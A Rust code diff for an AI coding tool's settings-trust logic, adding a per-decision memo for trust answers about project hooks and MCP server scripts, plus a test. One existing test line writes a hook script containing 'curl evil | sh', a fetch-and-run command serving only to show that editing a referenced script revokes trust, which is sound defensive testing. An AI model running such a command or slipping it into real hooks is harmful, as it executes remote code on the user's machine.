@@ -1179,10 +1179,18 @@ fn resolve_refs(
     out
 }
 
+#[cfg(test)]
+thread_local! {
+    // How many trust digests this test thread has computed.
+    pub(crate) static DIGESTS_TAKEN: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
+}
+
 /// Digest of a project settings file plus the contents of every file inside
 /// the project its hooks and MCP servers reference. A referenced file that is missing counts
 /// too, so creating it later invalidates the trust.
 pub fn trust_digest(cwd: &Path, text: &str) -> String {
+    #[cfg(test)]
+    DIGESTS_TAKEN.with(|n| n.set(n.get() + 1));
     let mut buf = text.as_bytes().to_vec();
     for (r, full, canon) in project_refs(cwd, text) {
         buf.extend_from_slice(b"\0");
@@ -1226,11 +1234,106 @@ pub fn project_file_trusted(cwd: &Path, name: &str, text: &str) -> bool {
     project_trust(cwd, name, text).is_some()
 }
 
+// ── trust answers within one permission decision ──────────────────────────
+// One gated tool call asks whether the project's settings are trusted
+// several times over: the allow, ask and deny rules ask, and so does each
+// lookup of the merged settings (saved approvals, allowed commands), and
+// every ask hashed every script the settings reference and read the trust
+// store again. Inside `with_trust_memo` the first answer for a file and its
+// exact text is reused for the rest of that one decision, and nowhere else:
+// nothing is kept from one call to the next, so an edited script or a
+// change of trust takes effect on the next call exactly as before. The
+// memo is switched off (`suspend_trust_memo`) before the decision runs a
+// PermissionRequest hook or waits on the person, either of which can change
+// the files, so no answer outlives a step that could make it wrong. The
+// check that runs right before a project hook (`hook_still_trusted`) never
+// uses it.
+//
+// Per thread, because a decision runs on one thread: None outside a
+// decision, Some(None) once suspended, Some(Some(answers)) while in use.
+type TrustAnswer = (PathBuf, String, String, Option<Vec<String>>);
+
+thread_local! {
+    static TRUST_MEMO: std::cell::RefCell<Option<Option<Vec<TrustAnswer>>>> =
+        const { std::cell::RefCell::new(None) };
+}
+
+struct TrustMemo;
+
+impl TrustMemo {
+    fn get(cwd: &Path, name: &str, text: &str) -> Option<Option<Vec<String>>> {
+        TRUST_MEMO.with(|m| {
+            let m = m.borrow();
+            let answers = m.as_ref()?.as_ref()?;
+            answers
+                .iter()
+                .find(|(c, n, t, _)| c == cwd && n == name && t == text)
+                .map(|(_, _, _, trust)| trust.clone())
+        })
+    }
+
+    fn put(cwd: &Path, name: &str, text: &str, trust: &Option<Vec<String>>) {
+        TRUST_MEMO.with(|m| {
+            if let Some(Some(answers)) = m.borrow_mut().as_mut() {
+                answers.push((
+                    cwd.to_path_buf(),
+                    name.to_string(),
+                    text.to_string(),
+                    trust.clone(),
+                ));
+            }
+        });
+    }
+}
+
+/// Runs one permission decision with trust answers reused inside it (see
+/// above). A decision nested in another shares the outer one's answers.
+pub(crate) fn with_trust_memo<T>(f: impl FnOnce() -> T) -> T {
+    struct End;
+    impl Drop for End {
+        fn drop(&mut self) {
+            TRUST_MEMO.with(|m| *m.borrow_mut() = None);
+        }
+    }
+    let outer = TRUST_MEMO.with(|m| {
+        let mut m = m.borrow_mut();
+        if m.is_some() {
+            return true;
+        }
+        *m = Some(Some(Vec::new()));
+        false
+    });
+    if outer {
+        return f();
+    }
+    let _end = End;
+    f()
+}
+
+/// Stops reusing trust answers for the rest of the current decision: it is
+/// about to run a hook or ask the person.
+pub(crate) fn suspend_trust_memo() {
+    TRUST_MEMO.with(|m| {
+        if let Some(answers) = m.borrow_mut().as_mut() {
+            *answers = None;
+        }
+    });
+}
+
 /// None when `<cwd>/.buildwithnexus/<name>` is not trusted at exactly this
 /// content; otherwise the keys the user said no to on their own (`base_url`,
 /// `permission`), which apply only where they tighten, as in an untrusted
 /// file. A store entry is the digest (all trusted) or {"digest", "declined"}.
 pub fn project_trust(cwd: &Path, name: &str, text: &str) -> Option<Vec<String>> {
+    if let Some(known) = TrustMemo::get(cwd, name, text) {
+        return known;
+    }
+    let trust = project_trust_now(cwd, name, text);
+    TrustMemo::put(cwd, name, text, &trust);
+    trust
+}
+
+fn project_trust_now(cwd: &Path, name: &str, text: &str) -> Option<Vec<String>> {
     let digest = trust_digest(cwd, text);
     if trusted_for_this_run(name, &digest) {
         return Some(Vec::new());
@@ -3485,6 +3588,60 @@ mod tests {
         std::fs::write(proj.join("hooks/a.sh"), "curl evil | sh").unwrap();
         assert!(!project_file_trusted(&proj, "settings.json", text));
 
+        std::env::remove_var("NEXUS_HOME");
+        let _ = std::fs::remove_dir_all(&h);
+    }
+
+    #[test]
+    fn trust_answers_are_reused_only_inside_one_decision() {
+        let _g = config::TEST_ENV_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
+        let h = std::env::temp_dir().join(format!("bwn-trustmemo-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&h);
+        let proj = h.join("proj");
+        std::fs::create_dir_all(proj.join("hooks")).unwrap();
+        std::env::set_var("NEXUS_HOME", h.join("home"));
+        std::fs::write(proj.join("hooks/a.sh"), "echo v1").unwrap();
+        let text = r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"sh hooks/a.sh"}]}]}}"#;
+        store_trust(
+            &proj,
+            &[config::UntrustedProjectFile {
+                name: "settings.json",
+                text: text.into(),
+                keys: vec!["hooks".into()],
+            }],
+        );
+        let digests = || DIGESTS_TAKEN.with(|n| n.get());
+        let start = digests();
+        with_trust_memo(|| {
+            assert!(project_file_trusted(&proj, "settings.json", text));
+            assert!(project_file_trusted(&proj, "settings.json", text));
+            // A nested decision shares the answers.
+            with_trust_memo(|| assert!(project_file_trusted(&proj, "settings.json", text)));
+            assert_eq!(digests() - start, 1);
+            // Other text is its own question.
+            assert!(!project_file_trusted(&proj, "settings.json", "{}"));
+            // About to run a hook or ask: from here on nothing is reused,
+            // so an edit made now (same size) is seen.
+            suspend_trust_memo();
+            std::fs::write(proj.join("hooks/a.sh"), "echo v2").unwrap();
+            assert!(!project_file_trusted(&proj, "settings.json", text));
+        });
+        // Outside a decision every ask is answered afresh.
+        std::fs::write(proj.join("hooks/a.sh"), "echo v1").unwrap();
+        let before = digests();
+        assert!(project_file_trusted(&proj, "settings.json", text));
+        assert!(project_file_trusted(&proj, "settings.json", text));
+        assert_eq!(digests() - before, 2);
+        // A memo started after an edit never serves the earlier answer.
+        with_trust_memo(|| {
+            assert!(project_file_trusted(&proj, "settings.json", text));
+        });
+        std::fs::write(proj.join("hooks/a.sh"), "echo v3").unwrap();
+        with_trust_memo(|| {
+            assert!(!project_file_trusted(&proj, "settings.json", text));
+        });
         std::env::remove_var("NEXUS_HOME");
         let _ = std::fs::remove_dir_all(&h);
     }
